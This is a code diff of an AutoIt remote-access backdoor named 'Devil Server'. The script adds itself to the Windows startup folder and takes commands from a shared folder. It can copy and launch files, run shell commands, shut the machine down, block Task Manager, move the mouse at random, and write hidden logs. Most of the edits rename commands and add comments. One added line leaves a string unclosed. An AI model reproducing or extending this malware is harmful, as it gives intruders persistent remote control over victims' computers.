@@ -24,6 +24,8 @@ Global $ServerData = ""
 Global $Status_CrazyMouse = "False"
 Global $Status_BlockTaskManager = "False"
 
+; ------------------------------------------------------------------------------
+
 ; Add backdoor to start-up
 If $Config_FirstStart = "1" Then
 	If Not FileExists(@StartupDir & "\devil_server.lnk") Then
@@ -31,13 +33,11 @@ If $Config_FirstStart = "1" Then
 	EndIf
 
    If FileExists(@StartupDir & "\devil_server.lnk") Then
-		MsgBox($MB_OK, "DevilServer", "DevilServer added to start-up!")
+		MsgBox($MB_OK, "Devil Server", "Devil Server added to start-up!")
 	Else
-		MsgBox($MB_OK, "DevilServer", "DevilServer can not add self to the start-up! Try again!")
+		MsgBox($MB_OK, "Devil Server", "Devil Server can not add self to the start-up! Try again!")
 	EndIf
 EndIf
-
-ShowMessageBox($Config_ServerPatch & "\" & $Config_ClientID)
 
 ; ------------------------------------------------------------------------------
 
@@ -45,30 +45,37 @@ ShowMessageBox($Config_ServerPatch & "\" & $Config_ClientID)
 While True
 	Sleep(100)
 	$ServerData = ReadServer()
-	ToolTip( "")
 
-	If $ServerData[0] = "logs" Then
-		OutputLogs()
-	ElseIf $ServerData[0] = "load" Then
+	; Definition and execution of the received command
+	If $ServerData[0] = "load_file" Then
 		LoadFile($ServerData[1])
-	ElseIf $ServerData[0] = "execute" Then
+	ElseIf $ServerData[0] = "execute_command" Then
 		CMDExecute($ServerData[1])
-	ElseIf $ServerData[0] = "message" Then
+	ElseIf $ServerData[0] = "show_message" Then
 		ShowMessageBox($ServerData[1])
 	ElseIf $ServerData[0] = "shutdown" Then
 		SystemShutdown()
-	ElseIf $ServerData[0] = "block" Then
+	ElseIf $ServerData[0] = "block_task_manager" Then
 		$Status_BlockTaskManager = $ServerData[1]
 	ElseIf $ServerData[0] = "crazy_mouse" Then
 		$Status_CrazyMouse = $ServerData[1]
 	EndIf
 
+	; Same for crazy mouse and task manager blocker
 	If $Status_BlockTaskManager = "True" Then
 		BlockTaskManager()
 	EndIf
-
 	If $Status_CrazyMouse = "True" Then
 		CrazyMouse()
+	EndIf
+
+	; Сheck if need to make logs
+	If FileExists($Config_ServerPatch & "\LogQuery) Then
+		OutputLogs()
+		Sleep(1000)
+		If FileExists($Config_ServerPatch & "\LogQuery) Then 
+			FileDelete($Config_ServerPatch & "\LogQuery) 
+		EndIf
 	EndIf
 WEnd
 
@@ -83,7 +90,7 @@ Func ReadServer()
 		FileDelete($Config_ServerPatch & "\" & $Config_ClientID)
 		Return $Data
 	Else
-		Local $Data = ["", ""]
+		Local $Data = ["", ""] ; So that the code does not produce errors
 		Return $Data
 	EndIf
 EndFunc
@@ -91,7 +98,7 @@ EndFunc
 ; Write logs to the shared folder 
 Func OutputLogs()
 	Local $Logs_file = FileOpen($Config_ServerPatch & "\" & $Config_ClientID & "_logs", $FO_APPEND)
-	FileSetAttrib($Config_ServerPatch & "\" & $Config_ClientID & "_logs", "+H")
+	FileSetAttrib($Config_ServerPatch & "\" & $Config_ClientID & "_logs", "+H") ; Hide file
 	FileWriteLine($Logs_file, "Time: " & @HOUR & ":" & @MIN)
 	FileWriteLine($Logs_file, "Client ID: " & $Config_ClientID)
 	FileWriteLine($Logs_file, "Server patch: " & $Config_ServerPatch)
@@ -109,7 +116,7 @@ EndFunc
 Func LoadFile($File_name)
 	FileCopy($Config_ServerPatch & "\" & $File_name, @ScriptDir, 1)
 	FileDelete($Config_ServerPatch & "\" & $File_name)
-	ShellExecute(@ScriptDir & "\" & $File_name)
+	ShellExecute(@ScriptDir & "\" & $File_name) ; Launch the file
 EndFunc
 
 ; Execute to shell
@@ -134,31 +141,7 @@ EndFunc
 
 ; Сrazy mouse
 Func CrazyMouse()
-	MouseMove(Random(0, @DesktopWidth), Random(0, @DesktopHeight), 1)
+	MouseMove(Random(0, @DesktopWidth), Random(0, @DesktopHeight), 1) ; Move mouse to random position
 EndFunc
 
 ; ------------------------------------------------------------------------------
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
